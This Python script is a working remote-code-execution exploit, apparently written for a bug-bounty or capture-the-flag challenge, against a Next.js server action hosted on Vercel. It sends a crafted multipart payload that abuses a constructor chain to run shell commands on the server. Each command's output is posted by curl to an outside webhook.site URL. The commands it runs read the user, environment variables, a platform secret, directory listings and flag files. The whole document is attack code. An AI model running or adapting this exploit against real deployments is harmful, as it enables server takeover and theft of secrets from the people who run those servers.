#!/usr/bin/env python3
"""
React2Shell with Webhook Exfiltration
Send command output to webhook.site
"""

import requests
import json
import random
import string
import urllib.parse

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def exploit_with_exfiltration(command, label="test"):
    """
    Execute command and exfiltrate output via webhook
    """
    print(f"\n[*] Executing: {command}")
    print(f"[*] Label: {label}")

    # Create JavaScript code that:
    # 1. Executes the command
    # 2. Sends output to webhook via curl
    code = f"""
const {{execSync}} = require('child_process');
try {{
    const output = execSync(`{command}`, {{timeout: 5000, encoding: 'utf8'}});
    const encoded = Buffer.from(output).toString('base64');
    execSync(`curl -X POST "{WEBHOOK}?label={label}" -H "Content-Type: text/plain" -d "${{encoded}}"`, {{timeout: 5000}});
}} catch(e) {{
    const errMsg = Buffer.from('ERROR: ' + e.message).toString('base64');
    execSync(`curl -X POST "{WEBHOOK}?label={label}_error" -d "${{errMsg}}"`, {{timeout: 5000}});
}}
"""

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {
        "constructor": {
            "constructor": code
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=20)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:200]}")

        if response.status_code == 500:
            print(f"[+] Exploit triggered! Check webhook for output: {WEBHOOK}")

        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

print("="*70)
print("React2Shell - Webhook Exfiltration")
print(f"Webhook: {WEBHOOK}")
print("="*70)

# Test 1: Simple command to verify RCE
exploit_with_exfiltration("whoami", "whoami")

# Wait a bit for the webhook to receive
import time
time.sleep(2)

# Test 2: Get the flag!
exploit_with_exfiltration("printenv VERCEL_PLATFORM_PROTECTION", "flag")

time.sleep(2)

# Test 3: Get all environment variables
exploit_with_exfiltration("env | grep VERCEL", "env_vercel")

time.sleep(2)

# Test 4: List directory contents
exploit_with_exfiltration("pwd && ls -la", "pwd_ls")

time.sleep(2)

# Test 5: Find flag files
exploit_with_exfiltration("find / -name '*flag*' -o -name '*VERCEL*' 2>/dev/null | head -10", "find_flag")

print(f"\n[*] All commands sent! Check your webhook: {WEBHOOK}")
print("="*70)
